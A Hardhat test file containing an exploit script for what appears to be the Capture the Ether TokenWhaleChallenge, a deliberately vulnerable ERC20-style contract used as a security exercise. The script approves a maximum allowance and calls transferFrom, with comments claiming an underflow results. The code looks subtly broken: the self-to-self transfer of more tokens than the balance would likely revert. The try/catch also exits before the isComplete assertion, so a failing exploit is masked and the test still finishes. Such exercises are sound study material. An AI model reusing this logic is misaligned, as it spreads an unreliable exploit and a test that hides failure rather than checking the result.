import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';

describe('TokenWhaleChallenge', () => {
  let target: Contract;
  let attacker: SignerWithAddress;
  let deployer: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('TokenWhaleChallenge', deployer)
    ).deploy(attacker.address);

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    try {
      // Step 1: Approve a large number of tokens for the attacker address
      const largeAllowance = ethers.constants.MaxUint256;
      console.log(`Approving allowance of: ${largeAllowance.toString()}`);
      await target.approve(attacker.address, largeAllowance);

      console.log('Approval successful');

      // Step 2: Transfer more tokens than the player has, causing an underflow
      const largeTransfer = ethers.BigNumber.from('1001');
      console.log(`Attempting to transfer: ${largeTransfer.toString()} tokens`);
      await target.transferFrom(attacker.address, attacker.address, largeTransfer);

      console.log('Transfer successful');
    } catch (error) {
      console.error('An error occurred:', error);
      return; // Exit the test if any step fails
    }

    // Check if the challenge is complete
    expect(await target.isComplete()).to.equal(true);
  });
});
